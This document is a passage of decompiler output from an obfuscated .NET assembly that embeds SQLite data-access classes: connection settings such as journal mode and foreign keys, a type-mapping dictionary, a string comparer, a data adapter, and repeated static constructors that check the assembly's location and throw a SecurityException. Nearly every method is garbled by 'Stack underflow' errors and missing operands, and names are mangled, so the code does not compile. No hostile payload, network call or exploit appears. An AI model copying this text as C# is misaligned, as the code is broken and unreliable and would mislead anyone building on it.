				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[Browsable(true)]
		[DisplayName("Journal Mode")]
		[DefaultValue(SQLiteJournalModeEnum.Default)]
		public SQLiteJournalModeEnum JournalMode
		{
			get
			{
				//IL_004d: Incompatible stack heights: 0 vs 2
				//IL_0054: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397839);
				object obj = default(object);
				/*Error near IL_005b: Stack underflow*/((object)/*Error near IL_005b: Stack underflow*/, (string)/*Error near IL_005b: Stack underflow*/, ref obj);
				if (obj is string)
				{
					return (SQLiteJournalModeEnum)_0086_0004._007E_0096_0008(_0084_0004._0095_0008(_0091._0080_0004(typeof(SQLiteJournalModeEnum).TypeHandle)), obj);
				}
				return (SQLiteJournalModeEnum)obj;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397839);
				object obj = (SQLiteJournalModeEnum)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DefaultValue(System.Data.IsolationLevel.Serializable)]
		[DisplayName("Default Isolation Level")]
		public System.Data.IsolationLevel DefaultIsolationLevel
		{
			get
			{
				//IL_004d: Incompatible stack heights: 0 vs 2
				//IL_0054: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397854);
				object obj = default(object);
				/*Error near IL_005b: Stack underflow*/((object)/*Error near IL_005b: Stack underflow*/, (string)/*Error near IL_005b: Stack underflow*/, ref obj);
				if (obj is string)
				{
					return (System.Data.IsolationLevel)_0086_0004._007E_0096_0008(_0084_0004._0095_0008(_0091._0080_0004(typeof(System.Data.IsolationLevel).TypeHandle)), obj);
				}
				return (System.Data.IsolationLevel)obj;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397854);
				object obj = (System.Data.IsolationLevel)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue((DbType)(-1))]
		[DisplayName("Default Database Type")]
		[Browsable(true)]
		public DbType DefaultDbType
		{
			get
			{
				//IL_0053: Incompatible stack heights: 0 vs 2
				//IL_005a: Incompatible stack heights: 0 vs 1
				//IL_0061: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397821);
				object obj = default(object);
				/*Error near IL_0061: Stack underflow*/((object)/*Error near IL_0061: Stack underflow*/, (string)/*Error near IL_0061: Stack underflow*/, ref obj);
				if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
				{
					if (obj is string)
					{
						return (DbType)_0086_0004._007E_0096_0008(_0084_0004._0095_0008(_0091._0080_0004(typeof(DbType).TypeHandle)), obj);
					}
					if (obj != null)
					{
						return (DbType)obj;
					}
				}
				return (DbType)(-1);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397821);
				object obj = (DbType)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DefaultValue(null)]
		[DisplayName("Default Type Name")]
		public string DefaultTypeName
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397768);
				object obj = default(object);
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, ref obj);
				if (obj == null)
				{
					return null;
				}
				return global::_0002._007E_0006(obj);
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397768);
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[Browsable(true)]
		[DisplayName("VFS Name")]
		[DefaultValue(null)]
		public string VfsName
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397779);
				object obj = default(object);
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, ref obj);
				if (obj == null)
				{
					return null;
				}
				return global::_0002._007E_0006(obj);
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397779);
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[DefaultValue(false)]
		[DisplayName("Foreign Keys")]
		[Browsable(true)]
		public bool ForeignKeys
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397734);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397734);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DisplayName("Recursive Triggers")]
		[DefaultValue(false)]
		public bool RecursiveTriggers
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397749);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397749);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DefaultValue(null)]
		[Browsable(true)]
		[DisplayName("ZipVFS Version")]
		public string ZipVfsVersion
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_002c: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397724);
				object obj = default(object);
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, ref obj);
				if (obj == null)
				{
					return null;
				}
				return global::_0002._007E_0006(obj);
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397724);
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/, (object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		[DefaultValue(SQLiteConnectionFlags.Default)]
		[Browsable(true)]
		public SQLiteConnectionFlags Flags
		{
			get
			{
				//IL_0058: Incompatible stack heights: 0 vs 2
				//IL_005f: Incompatible stack heights: 0 vs 1
				//IL_0066: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397671);
				object obj = default(object);
				/*Error near IL_0066: Stack underflow*/((object)/*Error near IL_0066: Stack underflow*/, (string)/*Error near IL_0066: Stack underflow*/, ref obj);
				if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
				{
					if (obj is SQLiteConnectionFlags)
					{
						return (SQLiteConnectionFlags)obj;
					}
					if (obj != null)
					{
						return (SQLiteConnectionFlags)_0086_0004._007E_0096_0008(_0084_0004._0095_0008(_0091._0080_0004(typeof(SQLiteConnectionFlags).TypeHandle)), obj);
					}
				}
				return SQLiteConnectionFlags.Default;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397671);
				object obj = (SQLiteConnectionFlags)/*Error near IL_0015: Stack underflow*/;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DisplayName("Set Defaults")]
		[Browsable(true)]
		[DefaultValue(true)]
		public bool SetDefaults
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397694);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397694);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DisplayName("To Full Path")]
		[DefaultValue(true)]
		public bool ToFullPath
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397645);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397645);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[DisplayName("No Default Flags")]
		[Browsable(true)]
		[DefaultValue(false)]
		public bool NoDefaultFlags
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107397660);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107397660);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		[Browsable(true)]
		[DefaultValue(false)]
		[DisplayName("No Shared Flags")]
		public bool NoSharedFlags
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0081_0004._007E_008F_0008;
				_0080._0014._0001(107398119);
				object obj = default(object);
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, ref obj);
				return global::_0011._0018._0001(obj);
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = _0083_0004._007E_0091_0008;
				_0080._0014._0001(107398119);
				object obj = (byte)/*Error near IL_0015: Stack underflow*/ != 0;
				/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (string)/*Error near IL_001a: Stack underflow*/, obj);
			}
		}

		public _0017()
		{
			_0001(null);
		}

		public _0017(string _0098_0017_0006)
		{
			_0001(_0098_0017_0006);
		}

		private void _0001(string _0002)
		{
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_007F_0004._008D_0008();
			new Hashtable((IEqualityComparer?)/*Error near IL_005b: Stack underflow*/);
			((_0017)/*Error near IL_0010: Stack underflow*/).m__0001 = (Hashtable)/*Error near IL_0010: Stack underflow*/;
			try
			{
				_0080_0004._008E_0008(this, this.m__0001);
			}
			catch (NotImplementedException)
			{
				global::_0011._0018._0001(this, this.m__0001);
			}
			if (!global::_001C._0096_0003(_0002))
			{
				_0082_0003._0012_0007(this, _0002);
			}
		}

		public unsafe override bool _0001(string _0002, out object _0003)
		{
			//IL_00fa: Incompatible stack heights: 0 vs 2
			//IL_0100: Incompatible stack heights: 0 vs 1
			//IL_0106: Incompatible stack heights: 0 vs 1
			_ = _0081_0004._008F_0008;
			bool flag = /*Error near IL_0019: Stack underflow*/((object)/*Error near IL_0019: Stack underflow*/, (string)/*Error near IL_0019: Stack underflow*/, ref *(object*)/*Error near IL_0019: Stack underflow*/);
			if (!_0087_0004._007E_0099_0008(this.m__0001, _0002))
			{
				return flag;
			}
			if (!(_0086_0004._007E_0097_0008(this.m__0001, _0002) is PropertyDescriptor propertyDescriptor))
			{
				return flag;
			}
			if (flag)
			{
				if ((object)_001D_0003._007E_009C_0006(propertyDescriptor) == _0091._0080_0004(typeof(bool).TypeHandle))
				{
					_0003 = global::_0011._0018._0001(_0003);
				}
				else if ((object)_001D_0003._007E_009C_0006(propertyDescriptor) != _0091._0080_0004(typeof(byte[]).TypeHandle))
				{
					_0003 = _0086_0004._007E_0096_0008(_0084_0004._0095_0008(_001D_0003._007E_009C_0006(propertyDescriptor)), _0003);
				}
			}
			else if (_0089_0004._007E_009C_0008(_0088_0004._007E_009B_0008(propertyDescriptor), _0091._0080_0004(typeof(DefaultValueAttribute).TypeHandle)) is DefaultValueAttribute defaultValueAttribute)
			{
				_0003 = _0083_0003._007E_001C_0007(defaultValueAttribute);
				flag = true;
			}
			return flag;
		}

		static _0017()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0014
{
	internal enum _0017
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 3,
		_0005 = 4,
		_0006 = 5,
		_0007 = 10,
		_0008 = 11
	}
}
namespace _000E
{
	internal enum _001D
	{
		_0001 = -1,
		_0002,
		_0003,
		_0004,
		_0005,
		_0006,
		_0007,
		_0008,
		_000E,
		_000F,
		_0010,
		_0011,
		_0012,
		_0013,
		_0014,
		_0015,
		_0016,
		_0017
	}
}
namespace _0012
{
	internal enum _0013
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 3,
		_0005 = 1
	}
}
namespace _0004
{
	internal enum _0019
	{
		_0001 = -1,
		_0002,
		_0003,
		_0004,
		_0005,
		_0006,
		_0007,
		_0008,
		_000E,
		_000F,
		_0010,
		_0011,
		_0012,
		_0013,
		_0014,
		_0015,
		_0016,
		_0017,
		_0018,
		_0019,
		_001A,
		_001B,
		_001C,
		_001D,
		_001E,
		_001F,
		_007F,
		_0080,
		_0081,
		_0082,
		_0083,
		_0084,
		_0086,
		_0087,
		_0088
	}
}
namespace _000E
{
	internal enum _001E
	{
		_0001,
		_0002
	}
}
namespace _0001
{
	internal enum _001C
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _001F
{
	internal sealed class _0018
	{
		internal DbType _0001;

		internal global::_0014._0017 _0001;

		public _0018()
		{
		}

		public _0018(global::_0014._0017 _0014_001D_0006, DbType _0016_0013)
			: this()
		{
			_0001 = _0014_001D_0006;
			this._0001 = _0016_0013;
		}
	}
}
namespace _0001
{
	internal sealed class _001D : Dictionary<string, global::_0006._0018>
	{
		internal Dictionary<DbType, global::_0006._0018> _0001;

		public _001D()
			: base((IEqualityComparer<string>?)new global::_007F._0018())
		{
			this._0001 = new Dictionary<DbType, global::_0006._0018>();
		}

		public _001D(IEnumerable<global::_0006._0018> _001A_007F)
			: this()
		{
			Add(_001A_007F);
		}

		public int _0001()
		{
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I4, but got Unknown
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			int num = 0;
			if (((_001D)/*Error near IL_000a: Stack underflow*/)._0001 != null)
			{
				int count = this._0001.Count;
				num = /*Error near IL_001a: Stack underflow*/+ count;
				this._0001.Clear();
			}
			num += base.Count;
			Clear();
			return num;
		}

		public void Add(IEnumerable<global::_0006._0018> collection)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0049: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107398130);
				new ArgumentNullException((string?)/*Error near IL_0049: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			foreach (global::_0006._0018 item in collection)
			{
				_0001(item);
			}
		}

		public void _0001(global::_0006._0018 _0002)
		{
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107398081);
				new ArgumentNullException((string?)/*Error near IL_005d: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			if (_0002._0001 == null)
			{
				throw new ArgumentException(global::_0080._0014._0001(107398104));
			}
			Add(_0002._0001, _0002);
			if (_0002._0001)
			{
				this._0001.Add(_0002._0001, _0002);
			}
		}

		static _001D()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0006
{
	internal sealed class _0018
	{
		internal string _0001;

		internal DbType _0001;

		internal bool _0001;

		internal _0018(string _0019_001D_0006, DbType _001A_001D_0006, bool _001B_001D_0006)
		{
			this._0001 = _0019_001D_0006;
			this._0001 = _001A_001D_0006;
			_0001 = _001B_001D_0006;
		}
	}
}
namespace _007F
{
	internal sealed class _0018 : IEqualityComparer<string>, IComparer<string>
	{
		public bool _0001(string _0002, string _0003)
		{
			//IL_000e: Incompatible stack heights: 0 vs 2
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = _0099_0003._0099_0007;
			/*Error near IL_0018: Stack underflow*/((string)/*Error near IL_0018: Stack underflow*/, (string)/*Error near IL_0018: Stack underflow*/, StringComparison.OrdinalIgnoreCase);
			return (byte)/*Error near IL_000d: Stack underflow*/ != 0;
		}

		bool IEqualityComparer<string>.Equals(string _0002, string _0003)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002, _0003);
		}

		public int _0001(string _0002)
		{
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 3
			//IL_0033: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = global::_001A._007E_001B_0003;
				_ = global::_0002._007E_0014;
				/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/);
				return /*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
			}
			throw new ArgumentNullException(_0080._0014._0001(107388827));
		}

		int IEqualityComparer<string>.GetHashCode(string _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002);
		}

		public int _0001(string _0002, string _0003)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 && (int)/*Error near IL_0008: Stack underflow*/ == 0)
			{
				return 0;
			}
			if ((int)/*Error near IL_000e: Stack underflow*/ == 0)
			{
				return -1;
			}
			if (_0003 == null)
			{
				return 1;
			}
			return _008A_0004._007E_009D_0008(_0002, _0003);
		}

		int IComparer<string>.Compare(string _0002, string _0003)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001(_0002, _0003);
		}

		static _0018()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001E
{
	[ToolboxItem("SQLite.Designer.SQLiteDataAdapterToolboxItem, SQLite.Designer, Version=1.0.105.2, Culture=neutral, PublicKeyToken=db937bc2d44ff139")]
	[DefaultEvent("RowUpdated")]
	[Designer("Microsoft.VSDesigner.Data.VS.SqlDataAdapterDesigner, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
	internal sealed class _0013 : DbDataAdapter
	{
		private bool m__0001 = true;

		private static object m__0001;

		private static object _0002;

		internal bool _0002;

		[DefaultValue(null)]
		[Editor("Microsoft.VSDesigner.Data.Design.DBCommandEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
		public new global::_0010._001C SelectCommand
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0013)/*Error near IL_001e: Stack underflow*/);
				_ = _008D_0004._0005_000E;
				return (global::_0010._001C)/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0013)/*Error near IL_001a: Stack underflow*/);
				_ = _008E_0004._0011_000E;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		[DefaultValue(null)]
		[Editor("Microsoft.VSDesigner.Data.Design.DBCommandEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
		public new global::_0010._001C InsertCommand
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0013)/*Error near IL_001e: Stack underflow*/);
				_ = _008D_0004._0006_000E;
				return (global::_0010._001C)/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0013)/*Error near IL_001a: Stack underflow*/);
				_ = _008E_0004._0012_000E;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		[Editor("Microsoft.VSDesigner.Data.Design.DBCommandEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
		[DefaultValue(null)]
		public new global::_0010._001C UpdateCommand
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0013)/*Error near IL_001e: Stack underflow*/);
				_ = _008D_0004._0007_000E;
				return (global::_0010._001C)/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0013)/*Error near IL_001a: Stack underflow*/);
				_ = _008E_0004._0013_000E;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		[DefaultValue(null)]
		[Editor("Microsoft.VSDesigner.Data.Design.DBCommandEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
		public new global::_0010._001C DeleteCommand
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0013)/*Error near IL_001e: Stack underflow*/);
				_ = _008D_0004._0008_000E;
				return (global::_0010._001C)/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
			}
			set
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				global::_0011._0018._0001((_0013)/*Error near IL_001a: Stack underflow*/);
				_ = _008E_0004._0014_000E;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, value);
			}
		}

		public event EventHandler<RowUpdatingEventArgs> RowUpdating
		{
			add
			{
